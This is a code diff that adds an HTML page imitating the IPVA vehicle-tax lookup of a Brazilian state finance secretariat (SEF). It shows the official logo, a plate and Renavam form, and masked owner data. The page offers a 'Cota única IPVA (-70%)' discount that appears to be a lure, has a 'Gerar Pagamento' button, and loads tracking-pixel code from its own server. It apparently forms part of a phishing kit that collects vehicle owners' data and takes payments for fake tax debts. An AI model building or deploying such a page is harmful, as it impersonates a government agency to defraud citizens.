@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Consultar IPVA - Secretaria de Estado de Fazenda</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="style_carousel.css">
+
+    <!-- Meta Pixel Code -->
+    <script>
+        // Load Meta Pixel dynamically from server
+        fetch('/api/get_pixel_code')
+            .then(r => r.text())
+            .then(code => {
+                if (code) {
+                    document.head.insertAdjacentHTML('beforeend', code);
+                    // Fire PageView event
+                    if (typeof fbq !== 'undefined') {
+                        fbq('track', 'PageView');
+                    }
+                }
+            });
+    </script>
+</head>
+
+<body>
+    <div class="mg-split-background">
+        <div class="mg-header-bg"></div>
+        <div class="mg-footer-bg"></div>
+    </div>
+
+    <!-- Main Container -->
+    <main class="mg-container">
+
+        <!-- Header Logo Area -->
+        <header class="mg-header-logo">
+            <img src="logo_sef.png" alt="SEF - Secretaria de Estado de Fazenda" class="sef-logo-img">
+        </header>
+
+        <!-- Centered Card -->
+        <div class="mg-card">
+            <div class="mg-card-header">
+                <a href="#" class="mg-back-link">
+                    <!-- Simple SVG Arrow -->
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M20 11H7.83L13.42 5.41L12 4L4 12L12 20L13.41 18.59L7.83 13H20V11Z" fill="#136B9E" />
+                    </svg>
+                    Voltar
+                </a>
+                <h1>Consultar IPVA e Taxa de Licenciamento</h1>
+                <p class="subtitle">Imposto sobre a Propriedade de Veículos Automotores</p>
+            </div>
+
+            <form id="consultForm" class="mg-form">
+
+                <div class="mg-input-group">
+                    <label for="plate">Placa *</label>
+                    <input type="text" id="plate" name="plate" placeholder="AAA-0A00" maxlength="8" required>
+                    <span class="error-msg" id="plateError"></span>
+                </div>
+
+                <div class="mg-input-group">
+                    <label for="renavam">Renavam *</label>
+                    <input type="text" id="renavam" name="renavam" placeholder="00000000000" maxlength="11" required>
+                    <span class="helper-text">O n° Renavam encontra-se no canto superior esquerdo do documento do
+                        veículo.</span>
+                </div>
+
+                <div class="mg-actions">
+                    <button type="submit" class="mg-btn-primary">CONSULTAR</button>
+                </div>
+
+            </form>
+
+            <div class="mg-card-footer-links">
+                <p>Confira a escala de vencimentos do <a href="#">calendário IPVA 2026</a>.</p>
+            </div>
+        </div>
+
+        <!-- Carousel / Person Image -->
+        <div class="mg-person-carousel">
+            <img src="person_0.webp" class="person-img active" alt="Person">
+            <img src="person_1.webp" class="person-img" alt="Person">
+            <img src="person_2.webp" class="person-img" alt="Person">
+            <img src="person_3.webp" class="person-img" alt="Person">
+            <img src="person_4.webp" class="person-img" alt="Person">
+            <img src="person_5.webp" class="person-img" alt="Person">
+        </div>
+    </main>
+
+    <!-- Result Modal / Overlay (Official Layout) -->
+    <div id="resultOverlay" class="result-overlay hidden">
+        <div class="result-card official-layout">
+            <button id="closeResult" class="close-btn">&times;</button>
+
+            <!-- 1. Dados do Veículo -->
+            <section class="section-official">
+                <h3 class="section-title">Dados do veículo</h3>
+                <div class="vehicle-grid">
+                    <div class="v-item"><span class="v-icon">👤</span>
+                        <div><span class="v-label">Nome:</span> <span class="v-value" id="resNome">*** *** ***</span>
+                        </div>
+                    </div>
+                    <div class="v-item"><span class="v-icon">📍</span>
+                        <div><span class="v-label">UF:</span> <span class="v-value" id="resUF">MG</span></div>
+                    </div>
+                    <div class="v-item"><span class="v-icon">🚗</span>
+                        <div><span class="v-label">Modelo:</span> <span class="v-value" id="resModelo">...</span></div>
+                    </div>
+                    <div class="v-item"><span class="v-icon">🔢</span>
+                        <div><span class="v-label">Placa:</span> <span class="v-value" id="resPlaca">...</span></div>
+                    </div>
+                    <div class="v-item"><span class="v-icon">🆔</span>
+                        <div><span class="v-label">CPF/CNPJ:</span> <span class="v-value">***.***.***-**</span></div>
+                    </div>
+                    <div class="v-item"><span class="v-icon">📄</span>
+                        <div><span class="v-label">Renavam:</span> <span class="v-value" id="resRenavam">...</span>
+                        </div>
+                    </div>
+                    <div class="v-item"><span class="v-icon">🔧</span>
+                        <div><span class="v-label">Chassi:</span> <span class="v-value">**********...</span></div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- 2. Total Disponível -->
+            <section class="section-official bg-light">
+                <h3 class="section-title">Total disponível para pagamento</h3>
+                <p class="section-subtitle">Selecionar todos os débitos disponíveis para pagamento.</p>
+
+                <div class="total-row">
+                    <div class="total-info">
+                        <span>Exercícios<br><strong>2026</strong></span>
+                        <div class="check-group">
+                            <input type="checkbox" checked readonly>
+                            <span>Selecionado</span>
+                        </div>
+                    </div>
+                    <div class="total-value-box">
+                        <span class="t-label">Total</span>
+                        <span class="t-price" id="resTotalTop">R$ 0,00</span>
+                    </div>
+                </div>
+                <button class="btn-gerar-pagamento">Gerar Pagamento</button>
+            </section>
+
+            <!-- 3. Detalhamento -->
+            <section class="section-official">
+                <h3 class="section-title">Detalhamento dos valores</h3>
+                <div class="year-block">
+                    <div class="year-header">
+                        <span>Exercício: <strong>2026</strong></span>
+                        <span class="year-total" id="resTotalDetail">Valor total a pagar: R$ 0,00</span>
+                    </div>
+
+                    <div class="cards-container">
+                        <!-- Cota Única (Promo) -->
+                        <div class="pay-card highlight-green">
+                            <div class="card-header">Cota única <strong>IPVA (-70%)</strong></div>
+                            <div class="card-body">
+                                <div class="date-row">📅 A vencer</div>
+                                <div class="date-val">11/02/2026</div>
+                                <div class="card-price" id="resCotaUnica">R$ 0,00</div>
+                            </div>
+                        </div>
+
+                        <!-- Parcelas -->
+                        <div class="pay-card">
+                            <div class="card-header">Parcela <strong>IPVA 1</strong></div>
+                            <div class="card-body">
+                                <div class="date-row">📅 A vencer</div>
+                                <div class="date-val">11/02/2026</div>
+                                <div class="card-price" id="resParcela1">R$ 0,00</div>
+                            </div>
+                        </div>
+                        <div class="pay-card">
+                            <div class="card-header">Parcela <strong>IPVA 2</strong></div>
+                            <div class="card-body">
+                                <div class="date-row">📅 A vencer</div>
+                                <div class="date-val">11/03/2026</div>
+                                <div class="card-price" id="resParcela2">R$ 0,00</div>
+                            </div>
+                        </div>
+                        <div class="pay-card">
+                            <div class="card-header">Parcela <strong>IPVA 3</strong></div>
+                            <div class="card-body">
+                                <div class="date-row">📅 A vencer</div>
+                                <div class="date-val">11/04/2026</div>
+                                <div class="card-price" id="resParcela3">R$ 0,00</div>
+                            </div>
+                        </div>
+
+                        <!-- Licenciamento (Fixed) -->
+                        <div class="pay-card">
+                            <div class="card-header"><strong>Licenciamento</strong></div>
+                            <div class="card-body">
+                                <div class="date-row">📅 A vencer</div>
+                                <div class="date-val">31/03/2026</div>
+                                <div class="card-price">R$ 35,62</div>
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+            </section>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+
+</html>
